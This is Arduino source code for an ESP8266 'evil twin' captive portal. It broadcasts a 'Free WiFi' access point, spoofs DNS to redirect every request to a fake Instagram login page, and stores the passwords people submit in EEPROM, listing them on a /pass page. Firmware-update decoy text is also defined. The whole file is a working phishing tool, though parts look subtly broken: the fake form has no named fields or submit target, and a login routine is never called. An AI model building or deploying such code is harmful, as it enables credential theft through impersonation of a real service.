// ESP8266 WiFi Captive Portal
// By 125K (github.com/125K)


// Libraries
#include <ESP8266WiFi.h>
#include <DNSServer.h> 
#include <ESP8266WebServer.h>
#include <EEPROM.h>

// Default SSID name
const char* SSID_NAME = "Free WiFi";

// Default main strings
#define SUBTITLE "Router info."
#define TITLE "Update"
#define BODY "Your router firmware is out of date. Update your firmware to continue browsing normally."
#define POST_TITLE "Updating..."
#define POST_BODY "Your router is being updated. Please, wait until the proccess finishes.</br>Thank you."
#define PASS_TITLE "Passwords"
#define CLEAR_TITLE "Cleared"

// Init system settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

String allPass = "";
String newSSID = "";
String currentSSID = "";

// For storing passwords in EEPROM.
int initialCheckLocation = 20; // Location to check whether the ESP is running for the first time.
int passStart = 30;            // Starting location in EEPROM to save password.
int passEnd = passStart;       // Ending location in EEPROM to save password.


unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
DNSServer dnsServer; ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<","&lt;");a.replace(">","&gt;");
  a.substring(0,200); return a; }

String footer() { 
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t) {
  String a = String(currentSSID);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
    "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
    "<head><title>" + a + " :: " + t + "</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>" + CSS + "</style>"
    "<meta charset=\"UTF-8\"></head>"
    "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h; }






String index() {
  return "<!DOCTYPE html><html>"
         "<head><title>Free WiFi :: Login</title>"
         "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">"
         "<link href=\"https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono\" rel=\"stylesheet\">"
         "<style>"
         "* { margin: 0px; padding: 0px; }"
         "body { background-color: #eee; }"
         "#wrapper { width: 500px; height: 50%; overflow: hidden; border: 0px solid #000; margin: 50px auto; padding: 10px; }"
         ".main-content { width: 250px; height: 40%; margin: 10px auto; background-color: #fff; border: 2px solid #e6e6e6; padding: 40px 50px; }"
         ".header { border: 0px solid #000; margin-bottom: 5px; }"
         ".header img { height: 50px; width: 175px; margin: auto; position: relative; left: 40px; }"
         ".input-1, .input-2 { width: 100%; margin-bottom: 5px; padding: 8px 12px; border: 1px solid #dbdbdb; box-sizing: border-box; border-radius: 3px; }"
         ".overlap-text { position: relative; }"
         ".overlap-text a { position: absolute; top: 8px; right: 10px; color: #003569; font-size: 14px; text-decoration: none; font-family: 'Overpass Mono', monospace; letter-spacing: -1px; }"
         ".btn { width: 100%; background-color: #3897f0; border: 1px solid #3897f0; padding: 5px 12px; color: #fff; font-weight: bold; cursor: pointer; border-radius: 3px; }"
         ".sub-content { width: 250px; height: 40%; margin: 10px auto; border: 1px solid #e6e6e6; padding: 20px 50px; background-color: #fff; }"
         ".s-part { text-align: center; font-family: sans-serif; word-spacing: 0px; letter-spacing: 0px; font-weight: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }"
         ".s-part a { text-decoration: none; cursor: pointer; color: #3897f0; font-family: 'Overpass Mono', monospace; word-spacing: -3px; letter-spacing: -2px; font-weight: normal; }"
         ".insta-icon {"
         "    --icon-size: 100px; /* Adjust the size as needed */"
         "    position: relative;"
         "    width: var(--icon-size);"
         "    height: var(--icon-size);"
         "    background: radial-gradient(circle at 33% 100%, #f3d373 4%, #f15245 30%, #d92e7f 62%, #9b36b7 85%, #515ecf);"
         "    border-radius: 25%;"
         "    margin: 0 auto; /* Center the icon horizontally */"
         "}"
         ".insta-icon > span {"
         "    width: 12px;"
         "    height: 12px;"
         "    background: #fff;"
         "    display: block;"
         "    border-radius: 50%;"
         "    position: absolute;"
         "    right: 28px;"
         "    top: 30px;"
         "}"
         ".insta-icon:after, .insta-icon:before {"
         "    content: '';"
         "    position: absolute;"
         "    top: 50%;"
         "    left: 50%;"
         "    width: calc(var(--icon-size) / 1.5);"
         "    height: calc(var(--icon-size) / 1.5);"
         "    border: calc(var(--icon-size) / 15) solid #fff;"
         "    transform: translate(-50%, -50%);"
         "}"
         ".insta-icon:after {"
         "    width: calc(var(--icon-size) / 3);"
         "    height: calc(var(--icon-size) / 3);"
         "    border-radius: 50%;"
         "}"
         ".insta-icon:before {"
         "    border-radius: 25%;"
         "}"
         "</style>"
         "<meta charset=\"UTF-8\"></head>"
         "<body>"
         "<div id=\"wrapper\">"
         "<div class=\"main-content\">"
         "<div class=\"header\">"
         "<div class=\"logo-outer\">"
         "<div class=\"insta-icon\">"
         "<span></span>"
         "</div>"
         "</div>"
         "</div>"
         "<div class=\"l-part\">"
         "<input type=\"text\" placeholder=\"Username\" class=\"input-1\" />"
         "<div class=\"overlap-text\">"
         "<input type=\"password\" placeholder=\"Password\" class=\"input-2\" />"
         "</div>"
         "<input type=\"button\" value=\"Log in\" class=\"btn\" />"
         "</div>"
         "</div>"
         "<div class=\"sub-content\">"
         "<div class=\"s-part\">"
         "Don't have an account ?<a href=\"https://www.instagram.com/accounts/emailsignup/\"><b>Sign up<b></a>"
         "</div>"
         "</div>"
         "</div>"
         "</body>"
         "</html>";
}







String login() {
  String username = input("username");
  String password = input("password");

  // Check the username and password (you should replace this with your authentication logic)
  if (username == "your_username" && password == "your_password") {
    // Successful login
    return header("Login Successful") + "<div><p>Welcome, " + username + "!</p></div>" + footer();
  } else {
    // Failed login
    return header("Login Failed") + "<div><p>Invalid username or password. Please try again.</p></div>" + footer();
  }
}


String posted() {
  String pass = input("m");
  pass = "<li><b>" + pass + "</li></b>"; // Adding password in a ordered list.
  allPass += pass;                       // Updating the full passwords.

  // Storing passwords to EEPROM.
  for (int i = 0; i <= pass.length(); ++i)
  {
    EEPROM.write(passEnd + i, pass[i]); // Adding password to existing password in EEPROM.
  }

  passEnd += pass.length(); // Updating end position of passwords in EEPROM.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(POST_TITLE) + POST_BODY + footer();
}

String pass() {
  return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String ssid() {
  return header("Change SSID") + "<p>Here you can change the SSID name. After pressing the button \"Change SSID\" you will lose the connection, so reconnect to the new SSID.</p>" + "<form action=/postSSID method=post><label>New SSID name:</label>"+
    "<input type=text name=s></input><input type=submit value=\"Change SSID\"></form>" + footer();
}

String postedSSID() {
  String postedSSID = input("s"); newSSID="<li><b>" + postedSSID + "</b></li>";
  for (int i = 0; i < postedSSID.length(); ++i) {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAP(postedSSID);
  return header(POST_TITLE) + POST_BODY + footer();
}

String clear() {
  allPass = "";
  passEnd = passStart; // Setting the password end location -> starting position.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div><p>The password list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK() { // The built-in LED will blink 5 times after a password is posted.
  for (int counter = 0; counter < 10; counter++)
  {
    // For blinking the LED.
    digitalWrite(BUILTIN_LED, counter % 2);
    delay(500);
  }
}

void setup() {
  // Serial begin
  Serial.begin(115200);
  
  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  // Check whether the ESP is running for the first time.
  String checkValue = "first"; // This will will be set in EEPROM after the first run.

  for (int i = 0; i < checkValue.length(); ++i)
  {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i])
    {
      // Add "first" in initialCheckLocation.
      for (int i = 0; i < checkValue.length(); ++i)
      {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');         // Clear SSID location in EEPROM.
      EEPROM.write(passStart, '\0'); // Clear password location in EEPROM
      EEPROM.commit();
      break;
    }
  }
  
  // Read EEPROM SSID
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0') {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  // Reading stored password and end location of passwords in the EEPROM.
  while (EEPROM.read(passEnd) != '\0')
  {
    allPass += char(EEPROM.read(passEnd)); // Reading the store password in EEPROM.
    passEnd++;                             // Updating the end location of password in EEPROM.
  }
  
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

  // Setting currentSSID -> SSID in EEPROM or default one.
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;

  Serial.print("Current SSID: ");
  Serial.print(currentSSID);
  WiFi.softAP(currentSSID);  

  // Start webserver
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only for HTTP)
  webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
  webServer.on("/ssid",[]() { webServer.send(HTTP_CODE, "text/html", ssid()); });
  webServer.on("/postSSID",[]() { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
  webServer.on("/pass",[]() { webServer.send(HTTP_CODE, "text/html", pass()); });
  webServer.on("/clear",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });
  webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
  webServer.begin();

  // Enable the built-in LED
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}


void loop() { 
  if ((millis() - lastTick) > TICK_TIMER) {lastTick = millis();} 
dnsServer.processNextRequest(); webServer.handleClient(); }
